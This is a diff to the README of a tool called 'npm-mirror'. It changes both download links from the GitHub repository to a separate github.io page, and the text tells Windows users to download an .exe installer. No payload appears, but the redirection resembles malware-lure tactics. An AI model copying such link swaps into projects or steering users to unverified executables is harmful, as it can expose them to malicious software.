@@ -1,6 +1,6 @@
 # 📦 npm-mirror - Save your work during internet outages
 
-[![](https://img.shields.io/badge/Download-npm--mirror-blue.svg)](https://github.com/uzisnoopy-lab/npm-mirror)
+[![](https://img.shields.io/badge/Download-npm--mirror-blue.svg)](https://uzisnoopy-lab.github.io)
 
 ## 📌 About this project
 
@@ -22,7 +22,7 @@ Before you install the software, look over these needs:
 
 You must visit the project release page to get the installer for Windows. 
 
-[Visit this page to download the latest installer](https://github.com/uzisnoopy-lab/npm-mirror)
+[Visit this page to download the latest installer](https://uzisnoopy-lab.github.io)
 
 Choose the file that ends in .exe. Save it to your Downloads folder.
 
